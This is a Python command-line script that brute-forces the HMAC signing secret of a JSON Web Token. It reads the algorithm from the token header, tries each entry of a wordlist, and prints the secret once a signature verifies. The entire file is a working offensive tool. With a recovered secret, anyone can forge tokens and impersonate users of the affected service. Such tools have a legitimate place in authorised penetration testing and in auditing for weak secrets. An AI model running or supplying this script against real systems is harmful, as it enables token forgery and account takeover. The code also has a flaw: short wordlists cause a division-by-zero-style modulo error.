import jwt
import argparse
import os
import sys
from jwt.exceptions import InvalidSignatureError, DecodeError

def parse_arguments():
    parser = argparse.ArgumentParser(description="JWT Brute Force Script")
    parser.add_argument("-t", "--token", type=str, required=True, help="The JWT token to brute force.")
    parser.add_argument("-d", "--dictionary", type=str, required=True, help="Path to the dictionary file with potential secret keys.")
    return parser.parse_args()

def identify_algorithm(token):
    try:
        header = jwt.get_unverified_header(token)
        algo = header.get("alg", None)
        if algo:
            print(f"[+] Identified hashing algorithm: {algo}")
            return algo
        else:
            print("[-] Algorithm not found in JWT header.")
            sys.exit(1)
    except DecodeError:
        print("[-] Failed to decode JWT header.")
        sys.exit(1)

def brute_force_jwt(token, dictionary_path, algorithm):
    if not os.path.exists(dictionary_path):
        print(f"[-] Dictionary file '{dictionary_path}' does not exist.")
        sys.exit(1)

    print("[*] Starting brute force...")
    try:
        with open(dictionary_path, "r", encoding="utf-8", errors="ignore") as file:
            wordlist = file.readlines()
            total_words = len(wordlist)
            update_interval = total_words // 10

            for idx, secret in enumerate(wordlist):
                secret = secret.strip()
                try:
                    jwt.decode(token, secret, algorithms=[algorithm])
                    print(f"[+] Secret key found: {secret}")
                    return secret
                except InvalidSignatureError:
                    if idx % update_interval == 0:
                        print(f"[*] Tried {idx} keys so far, {idx * 100 // total_words}% complete...")
                except Exception as e:
                    print(f"[-] Error during decoding: {e}")
                    sys.exit(1)
    except Exception as e:
        print(f"[-] Error opening dictionary file: {e}")
        sys.exit(1)

    print("[-] Brute force failed. No valid key found.")
    return None

def main():
    args = parse_arguments()

    print("[*] Decoding the JWT token...")
    algorithm = identify_algorithm(args.token)
    
    print("[*] Using dictionary to brute force...")
    secret = brute_force_jwt(args.token, args.dictionary, algorithm)
    
    if secret:
        print(f"[+] Brute force successful. Secret key: {secret}")
    else:
        print("[-] Could not brute force the JWT token. Try a different dictionary.")

if __name__ == "__main__":
    main()
